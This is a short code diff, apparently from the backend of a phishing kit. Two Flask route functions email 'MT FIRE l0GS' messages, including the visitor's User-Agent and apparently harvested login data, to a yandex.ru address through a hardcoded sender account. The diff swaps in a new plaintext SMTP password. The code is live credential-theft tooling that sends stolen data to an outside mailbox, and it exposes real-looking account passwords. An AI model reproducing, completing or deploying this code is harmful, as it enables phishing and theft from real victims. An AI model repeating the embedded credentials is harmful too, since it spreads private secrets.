@@ -179,7 +179,7 @@ def first():
         sender_email = 'procurement@lexctrading.com'
         sender_emaill = 'London@222$#'
         receiver_email = 'saintobitrans@yandex.ru'
-        password = 'Ozi@1989'
+        password = 'London@222$#'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'MT FIRE l0GS ! 1'
@@ -220,7 +220,7 @@ def second():
         sender_email = 'procurement@lexctrading.com'
         sender_emaill = 'London@222$#'
         receiver_email = 'saintobitrans@yandex.ru'
-        password = 'Ozi@1989'
+        password = 'London@222$#'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'MT FIRE l0GS !! 2'
